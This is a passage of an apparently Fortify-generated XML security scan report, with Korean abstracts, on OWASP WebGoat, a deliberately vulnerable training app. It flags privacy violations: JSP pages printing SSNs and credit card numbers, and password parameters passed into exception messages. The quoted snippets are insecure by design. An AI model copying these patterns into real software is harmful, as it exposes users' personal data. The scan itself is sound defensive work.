						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.SQLInjection.SQLInjection.CCN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1AEC87ABE2BBDC0159F5C8BFDD596CAD" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>204</LineStart>
<Snippet>    public String getSsn()
    {
	return ssn;
    }
</Snippet>
<TargetFunction>Read this.ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C1244A13CA3BF8F9BA502170CED62589" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>631</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>78</LineStart>
<Snippet>		    SQLInjection.EMPLOYEE_ID);
	    String password = s.getParser().getRawParameter(
		    SQLInjection.PASSWORD);

	    // Attempt authentication</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.SQLInjection.SQLInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7EDA4AB335E028B1A7620351353D9541" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	    String password = "";
	    username = s.getParser().getRawParameter(USERNAME);
	    password = s.getParser().getRawParameter(PASSWORD);

	    // don;t allow user name from other lessons.  it would be too simple.</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.DOS_Login.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ACF67FE69473AD2FCF83EC6E2600BBBF" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.CrossSiteScripting.CrossSiteScripting.SSN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="57FA7046BC7D07B612A460B6E68E9B03" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>631</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WsSAXInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSAXInjection.java</FilePath>
<LineStart>149</LineStart>
<Snippet>	    ec.addElement(makeInputLine(s));

	    password = s.getParser().getRawParameter(PASSWORD, null);

	    PRE pre = new PRE();</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WsSAXInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="78FE2B66450A4C4D846CAC6AF6BF77B5" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getCcn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>98</LineStart>
<Snippet>	this.startDate = startDate;
	this.salary = salary;
	this.ccn = ccn;
	this.ccnLimit = ccnLimit;
	this.disciplinaryActionDate = disciplinaryActionDate;</Snippet>
<TargetFunction>Read ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4F0D2AE110EAD60DB12D5EA2347458D6" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;span class="lesson_text_db"&gt;&lt;%=employee.getSsn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;span class="lesson_text_db"&gt;&lt;%=employee.getSsn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getSsn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CB29631933C8B9549C2F18F0A8BA7440" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>695</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>151</LineStart>
<Snippet>
	String username = s.getParser().getStringParameter(USERNAME, "");
	String password = s.getParser().getStringParameter(PASSWORD, "");

	if (username.equals(user) &amp;&amp; password.equals(pass))</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.Challenge2Screen.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="88445B07CC3E0782AA711B06CE2C649F" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getCcn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="38C4FE37119FCB9BC2C98938A60B93F6" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>132</LineStart>
<Snippet>    public String getCcn()
    {
	return ccn;
    }
</Snippet>
<TargetFunction>Read this.ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="74041EDF8320D2D6B8B66462C981A066" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>635</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>FailOpenAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/FailOpenAuthentication.java</FilePath>
<LineStart>73</LineStart>
<Snippet>	    {
		username = s.getParser().getRawParameter(USERNAME);
		password = s.getParser().getRawParameter(PASSWORD);

		// if credentials are bad, send the login page</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WeakAuthenticationCookie.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B5A6AD2192A37A873428D8DFB306F716" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>695</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>93</LineStart>
<Snippet>		    RoleBasedAccessControl.SALARY);
	    String ccn = s.getParser().getStringParameter(
		    RoleBasedAccessControl.CCN);
	    int ccnLimit = s.getParser().getIntParameter(
		    RoleBasedAccessControl.CCN_LIMIT);</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.CCN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3DC23CC8BAFF50E33AC2A2178C63952C" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>71</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>98</LineStart>
<Snippet>	this.startDate = startDate;
	this.salary = salary;
	this.ccn = ccn;
	this.ccnLimit = ccnLimit;
	this.disciplinaryActionDate = disciplinaryActionDate;</Snippet>
<TargetFunction>Read ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ECB29B873739C9E9F4B7F819389800F5" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.CrossSiteScripting.CrossSiteScripting.CCN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BBDD7E47BFA6F4D3D884A16F93DACDCE" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>127</LineStart>
<Snippet>    {
	String username = s.getParser().getStringParameter(USERNAME, "");
	String password = s.getParser().getStringParameter(PASSWORD, "");

	if ((username.length() &gt; 0) &amp;&amp; (password.length() &gt; 0))</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WeakAuthenticationCookie.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FAFC96964BAE184A51760B5BEE1D573E" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>204</LineStart>
<Snippet>    public String getSsn()
    {
	return ssn;
    }
</Snippet>
<TargetFunction>Read this.ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0377CACDE1F4A610BEF25E9911551213" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>631</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>272</LineStart>
<Snippet>		    SQLInjection.EMPLOYEE_ID);
	    String password = s.getParser().getRawParameter(
		    SQLInjection.PASSWORD);
	    switch (getStage(s))
	    {</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.SQLInjection.SQLInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CCCF2E26645D21ACE4F17192CB10D1D6" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>635</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>XPATHInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XPATHInjection.java</FilePath>
<LineStart>142</LineStart>
<Snippet>	    }

	    String password = s.getParser().getRawParameter(PASSWORD, "");
	    if (password == null || password.length() == 0)
	    {</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.XPATHInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="90D7CAFE0D1C512B87B698A733669D98" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>98</LineStart>
<Snippet>	this.startDate = startDate;
	this.salary = salary;
	this.ccn = ccn;
	this.ccnLimit = ccnLimit;
	this.disciplinaryActionDate = disciplinaryActionDate;</Snippet>
<TargetFunction>Read ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="653BC22E0B18298FA822AEA15C8DD8A6" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>XPATHInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XPATHInjection.java</FilePath>
<LineStart>142</LineStart>
<Snippet>	    }

	    String password = s.getParser().getRawParameter(PASSWORD, "");
	    if (password == null || password.length() == 0)
	    {</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.XPATHInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="14A1B567247BF568D0D344ACA37916A4" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>635</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	    String password = "";
	    username = s.getParser().getRawParameter(USERNAME);
	    password = s.getParser().getRawParameter(PASSWORD);

	    // don;t allow user name from other lessons.  it would be too simple.</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.DOS_Login.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9B61B294960F74E0A7640C0F617AEE9B" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
